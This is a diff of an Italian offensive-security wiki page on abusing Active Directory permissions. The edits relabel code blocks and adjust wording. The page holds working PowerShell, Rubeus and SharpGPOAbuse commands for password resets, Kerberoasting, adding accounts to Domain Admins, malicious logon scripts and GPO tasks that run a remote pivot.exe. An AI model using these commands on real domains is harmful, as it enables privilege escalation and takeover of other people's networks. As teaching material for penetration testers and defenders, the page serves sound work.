@@ -10,13 +10,13 @@ Questo privilegio concede a un attaccante il pieno controllo su un account utent
 
 - **Cambiare la Password del Target**: Utilizzando `net user <username> <password> /domain`, l'attaccante può reimpostare la password dell'utente.
 - **Kerberoasting Mirato**: Assegnare un SPN all'account dell'utente per renderlo kerberoastable, quindi utilizzare Rubeus e targetedKerberoast.py per estrarre e tentare di decifrare gli hash del ticket-granting ticket (TGT).
-```powershell
+```bash
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 ```
 - **Targeted ASREPRoasting**: Disabilita la pre-autenticazione per l'utente, rendendo il suo account vulnerabile all'ASREPRoasting.
-```powershell
+```bash
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
 ## **Diritti GenericAll sul Gruppo**
@@ -24,7 +24,7 @@ Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 Questo privilegio consente a un attaccante di manipolare le appartenenze ai gruppi se ha diritti `GenericAll` su un gruppo come `Domain Admins`. Dopo aver identificato il nome distinto del gruppo con `Get-NetGroup`, l'attaccante può:
 
 - **Aggiungersi al Gruppo Domain Admins**: Questo può essere fatto tramite comandi diretti o utilizzando moduli come Active Directory o PowerSploit.
-```powershell
+```bash
 net group "domain admins" spotless /add /domain
 Add-ADGroupMember -Identity "domain admins" -Members spotless
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
@@ -40,27 +40,27 @@ Avere questi privilegi su un oggetto computer o un account utente consente di:
 
 Se un utente ha diritti `WriteProperty` su tutti gli oggetti per un gruppo specifico (ad es., `Domain Admins`), può:
 
-- **Aggiungersi al Gruppo Domain Admins**: Realizzabile combinando i comandi `net user` e `Add-NetGroupUser`, questo metodo consente l'escalation dei privilegi all'interno del dominio.
-```powershell
+- **Add Themselves to the Domain Admins Group**: Raggiungibile combinando i comandi `net user` e `Add-NetGroupUser`, questo metodo consente l'escalation dei privilegi all'interno del dominio.
+```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
 ## **Self (Self-Membership) on Group**
 
-Questo privilegio consente agli attaccanti di aggiungersi a gruppi specifici, come `Domain Admins`, attraverso comandi che manipolano direttamente l'appartenenza ai gruppi. Utilizzando la seguente sequenza di comandi è possibile aggiungersi:
-```powershell
+Questo privilegio consente agli attaccanti di aggiungersi a gruppi specifici, come `Domain Admins`, attraverso comandi che manipolano direttamente l'appartenenza ai gruppi. Utilizzando la seguente sequenza di comandi è possibile l'auto-aggiunta:
+```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
 ## **WriteProperty (Auto-Membership)**
 
-Un privilegio simile, questo consente agli attaccanti di aggiungersi direttamente ai gruppi modificando le proprietà del gruppo se hanno il diritto `WriteProperty` su quei gruppi. La conferma e l'esecuzione di questo privilegio vengono eseguite con:
-```powershell
+Un privilegio simile, questo consente agli attaccanti di aggiungersi direttamente ai gruppi modificando le proprietà del gruppo se hanno il diritto di `WriteProperty` su quei gruppi. La conferma e l'esecuzione di questo privilegio vengono eseguite con:
+```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 net group "domain admins" spotless /add /domain
 ```
 ## **ForceChangePassword**
 
 Avere il `ExtendedRight` su un utente per `User-Force-Change-Password` consente il ripristino delle password senza conoscere la password attuale. La verifica di questo diritto e il suo sfruttamento possono essere effettuati tramite PowerShell o strumenti da riga di comando alternativi, offrendo diversi metodi per reimpostare la password di un utente, comprese sessioni interattive e one-liner per ambienti non interattivi. I comandi variano da semplici invocazioni di PowerShell all'uso di `rpcclient` su Linux, dimostrando la versatilità dei vettori di attacco.
-```powershell
+```bash
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
 Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -72,8 +72,8 @@ rpcclient -U KnownUsername 10.10.10.192
 ```
 ## **WriteOwner su Gruppo**
 
-Se un attaccante scopre di avere diritti `WriteOwner` su un gruppo, può cambiare la proprietà del gruppo a se stesso. Questo è particolarmente impattante quando il gruppo in questione è `Domain Admins`, poiché cambiare la proprietà consente un controllo più ampio sugli attributi e sui membri del gruppo. Il processo prevede l'identificazione dell'oggetto corretto tramite `Get-ObjectAcl` e poi l'uso di `Set-DomainObjectOwner` per modificare il proprietario, sia tramite SID che per nome.
-```powershell
+Se un attaccante scopre di avere diritti `WriteOwner` su un gruppo, può cambiare la proprietà del gruppo a se stesso. Questo è particolarmente impattante quando il gruppo in questione è `Domain Admins`, poiché cambiare la proprietà consente un controllo più ampio sugli attributi e sui membri del gruppo. Il processo prevede l'identificazione dell'oggetto corretto tramite `Get-ObjectAcl` e poi l'uso di `Set-DomainObjectOwner` per modificare il proprietario, sia tramite SID che nome.
+```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
 Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
@@ -81,13 +81,13 @@ Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ## **GenericWrite su Utente**
 
 Questo permesso consente a un attaccante di modificare le proprietà dell'utente. In particolare, con accesso `GenericWrite`, l'attaccante può cambiare il percorso dello script di accesso di un utente per eseguire uno script malevolo al momento dell'accesso dell'utente. Questo viene realizzato utilizzando il comando `Set-ADObject` per aggiornare la proprietà `scriptpath` dell'utente target per puntare allo script dell'attaccante.
-```powershell
+```bash
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
 ## **GenericWrite su Gruppo**
 
 Con questo privilegio, gli attaccanti possono manipolare l'appartenenza ai gruppi, ad esempio aggiungendo se stessi o altri utenti a gruppi specifici. Questo processo prevede la creazione di un oggetto di credenziali, utilizzandolo per aggiungere o rimuovere utenti da un gruppo e verificando le modifiche all'appartenenza con comandi PowerShell.
-```powershell
+```bash
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
 Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
@@ -97,7 +97,7 @@ Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'use
 ## **WriteDACL + WriteOwner**
 
 Possedere un oggetto AD e avere privilegi `WriteDACL` su di esso consente a un attaccante di concedere a se stesso privilegi `GenericAll` sull'oggetto. Questo viene realizzato attraverso la manipolazione di ADSI, consentendo il pieno controllo sull'oggetto e la possibilità di modificare le sue appartenenze ai gruppi. Nonostante ciò, esistono limitazioni quando si cerca di sfruttare questi privilegi utilizzando i cmdlet `Set-Acl` / `Get-Acl` del modulo Active Directory.
-```powershell
+```bash
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
 $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
@@ -106,7 +106,7 @@ $ADSI.psbase.commitchanges()
 ```
 ## **Replica sul Dominio (DCSync)**
 
-L'attacco DCSync sfrutta specifici permessi di replica sul dominio per mimare un Domain Controller e sincronizzare i dati, inclusi le credenziali degli utenti. Questa potente tecnica richiede permessi come `DS-Replication-Get-Changes`, consentendo agli attaccanti di estrarre informazioni sensibili dall'ambiente AD senza accesso diretto a un Domain Controller. [**Scopri di più sull'attacco DCSync qui.**](../dcsync.md)
+L'attacco DCSync sfrutta specifici permessi di replica sul dominio per mimare un Domain Controller e sincronizzare dati, inclusi le credenziali degli utenti. Questa potente tecnica richiede permessi come `DS-Replication-Get-Changes`, consentendo agli attaccanti di estrarre informazioni sensibili dall'ambiente AD senza accesso diretto a un Domain Controller. [**Scopri di più sull'attacco DCSync qui.**](../dcsync.md)
 
 ## Delegazione GPO <a href="#gpo-delegation" id="gpo-delegation"></a>
 
@@ -127,19 +127,19 @@ Per identificare GPO mal configurati, i cmdlet di PowerSploit possono essere con
 ### Abuso GPO - New-GPOImmediateTask
 
 I GPO mal configurati possono essere sfruttati per eseguire codice, ad esempio, creando un'attività pianificata immediata. Questo può essere fatto per aggiungere un utente al gruppo degli amministratori locali sulle macchine interessate, elevando significativamente i privilegi:
-```powershell
+```bash
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
 ### GroupPolicy module - Abuso di GPO
 
 Il modulo GroupPolicy, se installato, consente la creazione e il collegamento di nuovi GPO, e la configurazione di preferenze come valori di registro per eseguire backdoor sui computer interessati. Questo metodo richiede che il GPO venga aggiornato e che un utente acceda al computer per l'esecuzione:
-```powershell
+```bash
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
 ```
 ### SharpGPOAbuse - Abuso di GPO
 
-SharpGPOAbuse offre un metodo per abusare delle GPO esistenti aggiungendo attività o modificando impostazioni senza la necessità di creare nuove GPO. Questo strumento richiede la modifica delle GPO esistenti o l'uso di strumenti RSAT per crearne di nuove prima di applicare le modifiche:
+SharpGPOAbuse offre un metodo per abusare delle GPO esistenti aggiungendo attività o modificando impostazioni senza la necessità di creare nuove GPO. Questo strumento richiede la modifica delle GPO esistenti o l'uso degli strumenti RSAT per crearne di nuove prima di applicare le modifiche:
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
@@ -147,11 +147,11 @@ SharpGPOAbuse offre un metodo per abusare delle GPO esistenti aggiungendo attivi
 
 Gli aggiornamenti GPO si verificano tipicamente ogni 90 minuti. Per accelerare questo processo, specialmente dopo aver implementato una modifica, il comando `gpupdate /force` può essere utilizzato sul computer target per forzare un aggiornamento immediato della policy. Questo comando garantisce che eventuali modifiche alle GPO vengano applicate senza attendere il prossimo ciclo di aggiornamento automatico.
 
-### Dietro le quinte
+### Sotto il cofano
 
-Dopo aver ispezionato i Task Pianificati per una data GPO, come la `Misconfigured Policy`, è possibile confermare l'aggiunta di task come `evilTask`. Questi task vengono creati tramite script o strumenti da riga di comando con l'obiettivo di modificare il comportamento del sistema o di elevare i privilegi.
+Dopo aver ispezionato i Compiti Pianificati per una data GPO, come la `Misconfigured Policy`, è possibile confermare l'aggiunta di compiti come `evilTask`. Questi compiti vengono creati tramite script o strumenti da riga di comando con l'obiettivo di modificare il comportamento del sistema o di elevare i privilegi.
 
-La struttura del task, come mostrato nel file di configurazione XML generato da `New-GPOImmediateTask`, delinea le specifiche del task pianificato - inclusi il comando da eseguire e i suoi trigger. Questo file rappresenta come i task pianificati sono definiti e gestiti all'interno delle GPO, fornendo un metodo per eseguire comandi o script arbitrari come parte dell'applicazione delle policy.
+La struttura del compito, come mostrato nel file di configurazione XML generato da `New-GPOImmediateTask`, delinea le specifiche del compito pianificato - inclusi il comando da eseguire e i suoi trigger. Questo file rappresenta come i compiti pianificati sono definiti e gestiti all'interno delle GPO, fornendo un metodo per eseguire comandi o script arbitrari come parte dell'applicazione delle policy.
 
 ### Utenti e Gruppi
 
